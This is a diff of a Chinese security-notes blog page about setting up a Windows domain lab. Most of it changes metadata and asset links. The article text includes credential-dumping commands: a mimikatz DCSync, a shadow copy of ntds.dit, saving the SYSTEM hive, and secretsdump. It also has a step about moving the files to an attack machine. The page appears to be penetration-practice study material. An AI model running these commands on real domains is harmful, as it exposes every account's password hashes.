@@ -17,12 +17,28 @@
 <meta property="og:description" content="Windows 域控与域内主机的搭建流程、常见枚举命令，为域渗透练习打底。">
 <meta property="og:url" content="https://blogbu2154.site/ad-environment-setup/">
 <meta property="og:site_name" content="swfk 的安全笔记">
-<meta property="og:image" content="/medias/featureimages/23.jpg">
-<meta name="twitter:card" content="summary">
+<meta property="og:locale" content="zh_CN">
+
+<meta property="og:image" content="https://blogbu2154.site/medias/featureimages/23.jpg">
+<meta property="og:image:alt" content="域环境搭建 - swfk 的安全笔记">
+
+
+<meta property="article:published_time" content="2026-01-29T05:40:52+08:00">
+<meta property="article:modified_time" content="2026-01-29T05:40:52+08:00">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogbu2154.site/medias/featureimages/23.jpg">
 <link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
 <link rel="stylesheet" href="/css/clay.css">
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<link rel="stylesheet" href="/aplayer/APlayer.min.css">
+
+
+<link rel="dns-prefetch" href="https://giscus.app">
+<link rel="preconnect" href="https://giscus.app" crossorigin>
+
+
+<link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
 
 <script>
   // 尽早恢复主题，避免首屏闪烁
@@ -91,8 +107,6 @@
         <h1>域环境搭建</h1>
         <div class="post-meta">
           <time datetime="2026-01-29">2026-01-29</time>
-          
-            <span>更新于 2026-08-29</span>
           
         </div>
       </header>
@@ -212,14 +226,13 @@
 <p><strong>C:\Windows\NTDS\ntds.dit</strong></p>
 <p><code>**lsadump::dcsync /all /csv**</code></p>
 <h5 id="dcsync-域控同步服务"><a href="#dcsync-域控同步服务" class="headerlink" title="dcsync 域控同步服务"></a>dcsync 域控同步服务</h5><h4 id="域控读取ntds-dt"><a href="#域控读取ntds-dt" class="headerlink" title="域控读取ntds.dt"></a>域控读取ntds.dt</h4><p><strong>前提: 登录到域控</strong></p>
-<p>**vss 服务：volume shadow copy service 卷影复制服务。用于windows备份、windows还原点  **</p>
+<p><strong>vss 服务：volume shadow copy service 卷影复制服务。用于windows备份、windows还原点</strong></p>
 <h5 id="1-为域控的c盘创建一个副本（快照）"><a href="#1-为域控的c盘创建一个副本（快照）" class="headerlink" title="1 为域控的c盘创建一个副本（快照）"></a>1 为域控的c盘创建一个副本（快照）</h5><p><code>**vssadmin create shadow /for=c:**</code></p>
 <p><code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></p>
 <h5 id="2-从副本中把ntds-dit复制出来"><a href="#2-从副本中把ntds-dit复制出来" class="headerlink" title="2 从副本中把ntds.dit复制出来"></a>2 从副本中把ntds.dit复制出来</h5><p><code>copy   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ windows\ntds\ntds.dit   C:\ntds.dit</code></p>
 <h5 id="3-导出为-system-文件"><a href="#3-导出为-system-文件" class="headerlink" title="3 导出为 system 文件"></a>3 导出为 system 文件</h5><p><code>reg  save  HKLM\system  C:\system</code></p>
-<p><code>**secretsdump.exe -system system -ntds ntds.dit LOCAL**</code></p>
-<h5 id="4-把system文件和ntds-dit都传输到攻击机"><a href="#4-把system文件和ntds-dit都传输到攻击机" class="headerlink" title="4 把system文件和ntds.dit都传输到攻击机"></a>4 把system文件和ntds.dit都传输到攻击机</h5><hr>
-
+<p><code>secretsdump.exe -system system -ntds ntds.dit LOCAL</code></p>
+<h5 id="4-把system文件和ntds-dit都传输到攻击机"><a href="#4-把system文件和ntds-dit都传输到攻击机" class="headerlink" title="4 把system文件和ntds.dit都传输到攻击机"></a>4 把system文件和ntds.dit都传输到攻击机</h5>
       </div>
 
       
@@ -378,7 +391,7 @@
 <script src="/js/clay.js"></script>
 <script src="/js/search.js"></script>
 
-<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/aplayer/APlayer.min.js"></script>
 <script src="/js/music-loader.js"></script>
 
 
